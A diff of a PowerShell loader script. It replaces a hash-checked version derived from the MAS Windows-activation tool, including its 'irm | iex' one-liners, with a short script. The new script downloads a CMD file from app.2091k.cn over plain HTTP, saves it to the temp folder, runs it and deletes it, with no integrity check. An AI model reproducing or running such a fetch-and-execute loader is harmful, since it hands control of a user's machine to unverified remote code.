@@ -1,87 +1,22 @@
-# Check massgrave.dev for more details
-
-write-host
-Write-Host "The current command (irm https://massgrave.dev/get | iex) will be retired in the future."
-Write-Host -ForegroundColor Green "Use the new command (irm https://get.activated.win | iex) moving forward."
-write-host
-
-$troubleshoot = 'https://massgrave.dev/troubleshoot'
-if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
-    $ExecutionContext.SessionState.LanguageMode
-    Write-Host "Windows PowerShell is not running in Full Language Mode."
-    Write-Host "Help - https://gravesoft.dev/fix_powershell" -ForegroundColor White -BackgroundColor Blue
-    return
-}
-
-function Check3rdAV {
-    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
-    if ($avList) {
-        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
-        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
-    }
-}
-
-function CheckFile { 
-    param ([string]$FilePath) 
-    if (-not (Test-Path $FilePath)) { 
-        Check3rdAV
-        Write-Host "Failed to create MAS file in temp folder, aborting!"
-        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
-        throw 
-    } 
-}
-
+# 简洁版：下载并执行远程 CMD 脚本
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$URLs = @(
-    'http://app.2091k.cn/win/net3.5.cmd'
-)
 
-foreach ($URL in $URLs | Sort-Object { Get-Random }) {
-    try { $response = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
-}
+# 要执行的远程 CMD 脚本地址
+$url = 'http://app.2091k.cn/win/net3.5.cmd'
 
-if (-not $response) {
-    Check3rdAV
-    Write-Host "Failed to retrieve MAS from any of the available repositories, aborting!"
-    Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
+try {
+    $response = Invoke-WebRequest -Uri $url -UseBasicParsing
+} catch {
+    Write-Host "下载失败：$url" -ForegroundColor Red
     return
 }
 
-# Verify script integrity
-$releaseHash = 'EF2F705B9E8BE2816598E2E8B70BADB200733F2287B917D6C9666D95C63AFBF9'
-$stream = New-Object IO.MemoryStream
-$writer = New-Object IO.StreamWriter $stream
-$writer.Write($response)
-$writer.Flush()
-$stream.Position = 0
-$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
-if ($hash -ne $releaseHash) {
-    Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at $troubleshoot"
-    $response = $null
-    return
-}
+# 保存为临时文件
+$tempPath = "$env:TEMP\run_temp.cmd"
+$response.Content | Out-File -FilePath $tempPath -Encoding ASCII
 
-# Check for AutoRun registry which may create issues with CMD
-$paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
-foreach ($path in $paths) { 
-    if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
-        Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
-    } 
-}
+# 执行 CMD 脚本
+Start-Process "cmd.exe" -ArgumentList "/c `"$tempPath`"" -Wait
 
-$rand = [Guid]::NewGuid().Guid
-$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
-Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
-CheckFile $FilePath
-
-$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-$chkcmd = & $env:ComSpec /c "echo CMD is working"
-if ($chkcmd -notcontains "CMD is working") {
-    Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
-}
-saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
-CheckFile $FilePath
-
-$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+# 清理
+Remove-Item $tempPath -ErrorAction SilentlyContinue
